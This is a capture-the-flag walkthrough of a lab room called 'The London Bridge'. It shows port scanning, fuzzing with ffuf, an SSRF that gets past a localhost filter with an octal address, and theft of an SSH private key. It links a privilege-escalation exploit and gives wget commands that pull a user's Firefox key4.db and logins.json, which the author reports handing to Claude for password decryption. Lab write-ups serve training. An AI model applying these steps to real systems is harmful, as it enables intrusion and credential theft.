# The London Bridge

This is a classic boot2root, CTF-style room. Make sure to get all the flags.

This room can take up to 5 minutes to fully boot — please be patient.

Please use rate limiters while brute-forcing.

**Questions to answer:**
- What is the user flag?
- What is the root flag?
- What is the password of charles?

---

## Recon

```
sudo nmap -sS 10.82.177.229
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-19 15:00 BST
Nmap scan report for 10.82.177.229
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

The main webpage is on port 8080 — let's take a look at what's going on.

```
guest@lou:/media/guest/D/cyber/SecLists-master/Discovery/Web-Content$ gobuster dir -w DirBuster-2007_directory-list-2.3-big.txt -u http://10.82.177.229:8080 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.177.229:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1722]
/upload               (Status: 405) [Size: 178]
/dejaview             (Status: 200) [Size: 823]
```

`dejaview` isn't linked from the main page. After viewing it, we find an option to "upload" web URLs to display an image. This looks like the main vulnerability on this page. I tried uploading a reverse shell from my Python server but had no luck. The original POST body was `image_url=test.png`, so I decided to enumerate the parameter to see if there were other options.

**FFUF command:**

```
guest@lou:~$ ffuf -u http://10.82.177.229:8080/view_image \
  -w /media/guest/D/cyber/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://10.82.177.229:8080/dejaview" \
  -d "FUZZ=/view_image/uploads/test.png" \
  -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.82.177.229:8080/view_image
 :: Wordlist         : FUZZ: /media/guest/D/cyber/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Referer: http://10.82.177.229:8080/dejaview
 :: Data             : FUZZ=/view_image/uploads/test.png
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 306ms]
```

I tested this parameter in Burp and got a 500 "Internal Server Error." This looked like an SSRF. I changed it to `http://localhost:8080/uploads/test.png` and got a different error — 403 Forbidden. I then tried an obfuscated address, `www=http://0177.0.0.1:80/uploads/test.png`, and it worked — no errors.

I then fuzzed the server's file directory:

```
guest@lou:/media/guest/D/cyber/london bridge$ ffuf -u http://10.82.177.229:8080/view_image \
  -w /media/guest/D/cyber/SecLists-master/Discovery/Web-Content/raft-large-words.txt \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "www=http://0177.0.0.1:80/FUZZ" \
  -ac \
  -t 100

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.82.177.229:8080/view_image
 :: Wordlist         : FUZZ: /media/guest/D/cyber/SecLists-master/Discovery/Web-Content/raft-large-words.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://0177.0.0.1:80/FUZZ
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 80ms]
uploads                 [Status: 200, Size: 671, Words: 24, Lines: 23, Duration: 140ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 310ms]
.                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 297ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 297ms]
.local                  [Status: 200, Size: 414, Words: 19, Lines: 18, Duration: 282ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 237ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 297ms]
.bash_logout            [Status: 200, Size: 220, Words: 35, Lines: 8, Duration: 242ms]
.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 255ms]
localhost               [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 193ms]
.env                    [Status: 200, Size: 533, Words: 22, Lines: 21, Duration: 275ms]
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 299ms]
.gnupg                  [Status: 200, Size: 372, Words: 17, Lines: 16, Duration: 228ms]
:: Progress: [119600/119600] :: Job [1/1] :: 223 req/sec :: Duration: [0:05:09] :: Errors: 1 ::
```

After fuzzing, I found a `.ssh` directory containing a private RSA key and the associated username.

```
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa beth@10.82.177.229
```

## Foothold and privilege escalation

I finally got into the system and found the first flag in the `__pycache__` directory: **THM{l0n6_##########_qu33n}**.

Next, I needed root privileges. After some research, I found the system was vulnerable to a privilege escalation exploit at [zerozenxlabs/ZDI-24-020](https://github.com/zerozenxlabs/ZDI-24-020/blob/main/exploit.c), which worked and gave me root access. From `/root`, I retrieved the admin flag: **THM{l0nd0n_######_p47ch3d}**.

## Charles's flag

To find Charles's flag, I checked his home directory and found it empty at first. Running `ls -all` revealed a bunch of old Firefox profile data, including a login backup file and a key file. I spun up a Python server on the victim machine and pulled the files down:

```
wget http://victim.com/./.mozilla/firefox/8k3bf3zp.charles/key4.db
wget http://victim.com/./.mozilla/firefox/8k3bf3zp.charles/logins.json
```

I sent both files to Claude to decrypt and recover the saved password, and got the final answer: **king##############**

